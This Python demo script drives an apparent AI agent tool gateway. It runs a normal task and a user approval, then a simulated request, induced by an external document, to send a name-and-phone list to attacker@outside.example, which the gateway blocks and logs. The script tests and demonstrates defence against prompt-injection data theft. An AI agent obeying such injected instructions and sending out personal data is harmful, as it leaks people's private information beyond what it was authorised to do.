#!/usr/bin/env python3
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from backend.agent_core import DemoOrchestrator
from backend.api import serialize_events
from backend.bootstrap import build_runtime
from backend.models import ToolRequest, TrustLevel


def main():
    gateway, workspace = build_runtime()
    orchestrator = DemoOrchestrator(gateway)

    print("\n1) 正常任务与群发确认")
    results = orchestrator.create_activity("task-normal")
    for result in results:
        print(json.dumps(result.to_dict(), ensure_ascii=False, indent=2))

    pending_id = results[1].request_id
    approved = gateway.resolve(pending_id, approved=True)
    print("\n2) 用户批准后的结果")
    print(json.dumps(approved.to_dict(), ensure_ascii=False, indent=2))

    malicious = ToolRequest(
        task_id="task-risk",
        agent_id="activity-assistant",
        tool_name="send_notice",
        action="send",
        arguments={
            "recipient": "attacker@outside.example",
            "recipient_count": 1,
            "content": "附件名单",
            "fields": ["name", "phone"],
        },
        source_trust=TrustLevel.EXTERNAL_UNTRUSTED,
    )
    blocked = gateway.submit(malicious)
    print("\n3) 外部文档诱导的越权请求")
    print(json.dumps(blocked.to_dict(), ensure_ascii=False, indent=2))

    print("\n4) Trace 事件数量: {}".format(len(gateway.audit_events)))
    print(
        json.dumps(serialize_events(gateway.audit_events), ensure_ascii=False, indent=2)
    )
    print("\n模拟通知发送数: {}".format(len(workspace.notifications)))


if __name__ == "__main__":
    main()
